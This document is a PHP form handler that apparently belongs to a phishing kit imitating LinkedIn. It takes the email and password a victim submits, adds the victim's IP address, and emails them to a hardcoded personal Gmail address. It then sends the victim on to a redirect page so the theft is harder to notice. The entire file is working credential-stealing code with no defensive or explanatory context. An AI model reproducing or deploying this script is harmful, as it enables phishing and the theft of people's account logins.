<?php 
if(isset($_POST['Submit'])){

	// collect ip address 
    $to = "bennydad303@gmail.com"; // this is your Email address
    $from = 'logforlink@thisserver.com'; 
	

    $session_key = $_POST['session_key'];
    $sarogiwa = $_POST['sarogiwa'];
	$ip = getenv("REMOTE_ADDR");

	
    $subject = "Linked in Notification from $ip";
    $message = "\n\n Email:" .  $session_key . "\n\n Password:" .  $sarogiwa . "\n\n IP:" .  $ip ;

    $headers = "From:" . $from;
    
     mail($to,$subject,$message,$headers);
	 
	

	if (!headers_sent()) {
	// No header sent , so you can use PHP to redirect //

	header("HTTP/1.1 301 Moved Permanently");
	header ("Location: redirect.php");
	exit;

	}else{

	// Header already sent, so use JavaScript to redirect //
	print "<script>";
	print " self.location='redirect.php';";
	print "</script>";
	}
    }
?>